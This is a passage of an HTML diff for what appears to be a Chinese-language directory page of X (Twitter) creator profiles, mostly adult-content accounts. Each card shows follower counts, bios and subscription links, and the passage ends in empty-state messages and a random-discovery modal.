+            <span>971.4K 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">性癖8割 その他2割 サブ@kuzu_v1
+网址: <a href="https://lit.link/kuzuvO" target="_blank" onclick="event.stopPropagation();">https://lit.link/kuzuvO ↗</a></div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/kuzu_v53" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('kuzu_v53', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div></div><div class="masonry-column"><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 20ms; --card-accent-rgb: 168, 85, 247; --card-accent: rgb(168, 85, 247);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/Anaimiya_banner.jpg" alt="Naimi奶咪" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=covers%2FAnaimiya_banner.jpg', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/Anaimiya_400x400.jpg" alt="Naimi奶咪" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FAnaimiya_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="Naimi奶咪">Naimi奶咪</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/Anaimiya" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('Anaimiya', 'card');">@Anaimiya</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>4.3M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">All my Works 👇 我的全部作品
+网址: <a href="http://linktr.ee/anaimiya_vip" target="_blank" onclick="event.stopPropagation();">http://linktr.ee/anaimiya_vip ↗</a></div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/Anaimiya" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('Anaimiya', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 60ms; --card-accent-rgb: 168, 85, 247; --card-accent: rgb(168, 85, 247);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1332890594604064768_1673589522_600x200" alt="HongKongDoll" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1332890594604064768/1673589522/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/HongKong_Doll_400x400.jpg" alt="HongKongDoll" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FHongKong_Doll_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="HongKongDoll">HongKongDoll</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/HongKong_Doll" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('HongKong_Doll', 'card');">@HongKong_Doll</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>3.2M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">✰ All Works &amp; DM 订阅指南 <a href="https://t.co/NgAYsSVQBO" target="_blank" onclick="event.stopPropagation();">https://t.co/NgAYsSVQBO ↗</a> ✰ Crypto @HongKongDoll ✰ 中文 @HongKongDoll_CN 日本語 @HongKongDoll_JA ✰ 成人用品/平台商务合作联系 <a href="https://t.co/NJWqU9eIq8" target="_blank" onclick="event.stopPropagation();">https://t.co/NJWqU9eIq8 ↗</a> (非本人)
+网址: <a href="http://hongkongdoll.tv/" target="_blank" onclick="event.stopPropagation();">http://hongkongdoll.tv ↗</a>
+位置: 18+ Videos / 作品订阅 / 广告合作👉🏻</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/HongKong_Doll" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('HongKong_Doll', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 140ms; --card-accent-rgb: 244, 63, 94; --card-accent: rgb(244, 63, 94);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1871187501911859200_1744176043_600x200" alt="趣趣" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1871187501911859200/1744176043/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/ququ999999_400x400.jpg" alt="趣趣" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2Fququ999999_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="趣趣">趣趣</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/ququ999999" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('ququ999999', 'card');">@ququ999999</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.2M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">已过布尔玛原创认证/只做原创内容/完整版私聊过🚪进电报观看❤️/可定制视频图片/御姐178 50/无线下/无墙内联系方式/自助入群👉🏻<a href="https://t.co/3D4AubGJkU" target="_blank" onclick="event.stopPropagation();">https://t.co/3D4AubGJkU ↗</a>
+网址: <a href="http://linktr.ee/ququ2003" target="_blank" onclick="event.stopPropagation();">http://linktr.ee/ququ2003 ↗</a>
+位置: 全部联系方式</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/ququ999999" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('ququ999999', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 200ms; --card-accent-rgb: 239, 68, 68; --card-accent: rgb(239, 68, 68);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1635572492717682693_1773126587_600x200" alt="静香" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1635572492717682693/1773126587/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/DLjingxiang_400x400.jpg" alt="静香" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FDLjingxiang_400x400.jpg', 'avatar');">
+            
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="静香">静香</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/DLjingxiang" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('DLjingxiang', 'card');">@DLjingxiang</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>994.9K 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">暂无个人简介</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/DLjingxiang" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('DLjingxiang', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div></div><div class="masonry-column"><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 40ms; --card-accent-rgb: 244, 63, 94; --card-accent: rgb(244, 63, 94);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/waifupupu_banner.jpg" alt="♡pupuwaifu♡" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=covers%2Fwaifupupu_banner.jpg', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/waifupupu_400x400.jpg" alt="♡pupuwaifu♡" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2Fwaifupupu_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="♡pupuwaifu♡">♡pupuwaifu♡</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/waifupupu" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('waifupupu', 'card');">@waifupupu</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>3.3M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">♡You look lonely, I can fix that
+♡‌正版订阅➡️<a href="https://t.co/xpZIPeE6jU" target="_blank" onclick="event.stopPropagation();">https://t.co/xpZIPeE6jU ↗</a>
+♡‌支持ZFB➡️<a href="https://t.co/5cC2ulFKMT" target="_blank" onclick="event.stopPropagation();">https://t.co/5cC2ulFKMT ↗</a>
+♡‌TG订阅➡️<a href="https://t.co/nJNIVYX777" target="_blank" onclick="event.stopPropagation();">https://t.co/nJNIVYX777 ↗</a>
+网址: <a href="https://s.tb.cn/c.0xdoMY" target="_blank" onclick="event.stopPropagation();">https://s.tb.cn/c.0xdoMY ↗</a>
+位置: 快带我回家😈1：1 阿黑杯、名器等官方周边✨➡️</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/waifupupu" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('waifupupu', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 100ms; --card-accent-rgb: 236, 72, 153; --card-accent: rgb(236, 72, 153);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1146457192897421312_1609692104_600x200" alt="JuneLiu SpicyGum🍬" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1146457192897421312/1609692104/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/SpicygumL_400x400.jpg" alt="JuneLiu SpicyGum🍬" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FSpicygumL_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="JuneLiu SpicyGum🍬">JuneLiu SpicyGum🍬</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/SpicygumL" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('SpicygumL', 'card');">@SpicygumL</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.8M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">Check my links🌶️▶️<a href="https://t.co/uXg8RAxAWB" target="_blank" onclick="event.stopPropagation();">https://t.co/uXg8RAxAWB ↗</a> ◀此列表外皆为假冒 / DM &amp; updates⬇️
+网址: <a href="https://onlyfans.com/juneliu" target="_blank" onclick="event.stopPropagation();">https://onlyfans.com/juneliu ↗</a>
+位置: 👉🏻</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/SpicygumL" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('SpicygumL', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 160ms; --card-accent-rgb: 244, 63, 94; --card-accent: rgb(244, 63, 94);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/photo-1550745165-9bc0b252726f" alt="江江" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/Joycelyn52011_400x400.jpg" alt="江江" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FJoycelyn52011_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="江江">江江</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/Joycelyn52011" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('Joycelyn52011', 'card');">@Joycelyn52011</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.1M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">防走丢小号@Fishbae00 |  私人wx🚪288｜电报群 388 | 唯一私人电报: <a href="https://t.co/VNDOSgeTdE%EF%BD%9C%E8%A7%A3%E9%94%81%E6%9B%B4%E5%A4%9A%EF%BC%9A" target="_blank" onclick="event.stopPropagation();">https://t.co/VNDOSgeTdE｜解锁更多： ↗</a> <a href="https://t.co/nso6jUzUwu" target="_blank" onclick="event.stopPropagation();">https://t.co/nso6jUzUwu ↗</a>
+位置: 距离你20km</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/Joycelyn52011" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('Joycelyn52011', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 180ms; --card-accent-rgb: 249, 115, 22; --card-accent: rgb(249, 115, 22);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1075608430772072448_1720237643_600x200" alt="Sexy Yuki" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1075608430772072448/1720237643/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/SxeYuki_400x400.jpg" alt="Sexy Yuki" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FSxeYuki_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="Sexy Yuki">Sexy Yuki</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/SxeYuki" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('SxeYuki', 'card');">@SxeYuki</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.1M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">佛系交友，日常更新！⚠️别的平台没有账号，没有电报群⚠️，帖子不定期删除，唯一私密账号→@MissYukibaby。不接推广，不卖号。⚠️除了这个大号和私密号回复是本人，其他的都不是我，注意别被骗⚠️
+位置: ✈️🚄</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/SxeYuki" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('SxeYuki', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div></div></div>
+
+        <!-- Infinite Scroll Sentinel Indicator -->
+        <div id="infinite-scroll-sentinel" class="infinite-scroll-loading">
+          <div class="infinite-spinner"></div>
+          <span>加载更多博主中...</span>
+        </div>
+
+        <!-- Empty State 1: Database Empty -->
+        <div class="v2-empty-state hidden" id="empty-state-db">
+          <div class="empty-icon-wrap" style="color: var(--accent-gold); background: var(--accent-gold-subtle);">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="2"></rect><path d="M3 9h18"></path><path d="M9 21V9"></path></svg>
+          </div>
+          <h3 class="empty-title">当前归档库尚无博主数据</h3>
+          <p class="empty-desc">您可以前往管理后台一键同步 X (Twitter) 关注列表。</p>
+          <div style="display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; margin-top: 6px;">
+            
+          </div>
+        </div>
+
+        <!-- Empty State 2: Filter/Search Mismatch -->
+        <div class="v2-empty-state hidden" id="empty-state-search">
+          <div class="empty-icon-wrap">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line><line x1="8" y1="11" x2="14" y2="11"></line></svg>
+          </div>
+          <h3 class="empty-title">未找到匹配的博主</h3>
+          <p class="empty-desc">没有匹配到任何符合搜索条件或分类的博主，您可以尝试清除关键词。</p>
+          <button class="btn-reset-filters" id="btn-reset-filters">重置筛选条件</button>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- Impeccable Frameless Floating Single Card Random Discovery Modal (React-Bits Slot Machine) -->
+    <div class="roulette-backdrop hidden" id="random-roulette-backdrop">
+      <div class="roulette-frameless-wrapper">
+        
+        <!-- Single Pure Card (No outer white container or headers) -->
+        <div class="roulette-floating-card" id="roulette-card-container">
+          <div class="roulette-banner" id="roulette-banner" style="background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800&amp;auto=format&amp;fit=crop&amp;q=80');"></div>
+          
+          <div class="roulette-avatar-zone">
+            <div style="position: relative; overflow: visible;">
+              <img id="roulette-avatar" class="roulette-avatar-img" src="/static/bloggers-assets/default_profile_400x400.png" alt="Avatar">
+              <span id="roulette-verified" class="badge-verified-native" style="bottom: 0; right: 0;">
+                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+            </div>
+            <span id="roulette-tag" class="card-influence-pill top-tier">Top Creator</span>
+          </div>
+
+          <div class="roulette-info-zone">
+            <div class="roulette-name-row">
+              <span id="roulette-name" class="roulette-name">博主昵称</span>
+            </div>
+            <span id="roulette-handle" class="roulette-handle">@handle · 0 关注者</span>
+            <div id="roulette-bio" class="roulette-bio">博主简介信息正在流转...</div>
+          </div>
+        </div>
+
+        <!-- Pure Bottom Action Buttons (Hidden during shuffling, revealed upon settle) -->
+        <div class="roulette-outside-actions" id="roulette-outside-actions">
+          <a class="btn-roulette-visit" id="btn-roulette-visit" href="https://x.com/" target="_blank">
+            <span>直达 X 个人主页</span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+          </a>
+          <button class="btn-reshuffle" id="btn-reshuffle-again">
